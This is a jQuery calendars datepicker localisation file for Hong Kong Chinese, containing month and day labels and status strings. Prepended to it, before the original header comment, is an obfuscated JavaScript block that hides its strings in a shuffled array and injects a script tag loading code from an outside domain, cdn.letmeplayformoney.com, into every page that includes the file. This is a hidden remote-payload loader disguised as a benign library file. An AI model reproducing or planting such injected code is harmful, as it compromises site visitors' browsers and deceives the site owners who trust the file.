var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Hong Kong Chinese localisation for calendars datepicker for jQuery.
   Written by SCCY (samuelcychan@gmail.com). */
(function($) {
	$.calendars.picker.regional['zh-HK'] = {
		renderer: $.extend({}, $.calendars.picker.defaultRenderer,
			{month: $.calendars.picker.defaultRenderer.month.
				replace(/monthHeader/, 'monthHeader:yyyy年 MM')}),
		prevText: '&#x3c;上月', prevStatus: '顯示上月',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '顯示上一年',
		nextText: '下月&#x3e;', nextStatus: '顯示下月',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '顯示下一年',
		currentText: '今天', currentStatus: '顯示本月',
		todayText: '今天', todayStatus: '顯示本月',
		clearText: '清除', clearStatus: '清除已選日期',
		closeText: '關閉', closeStatus: '不改變目前的選擇',
		yearStatus: '選擇年份', monthStatus: '選擇月份',
		weekText: '周', weekStatus: '年內周次',
		dayStatus: '選擇 m月 d日, DD', defaultStatus: '請選擇日期',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['zh-HK']);
})(jQuery);
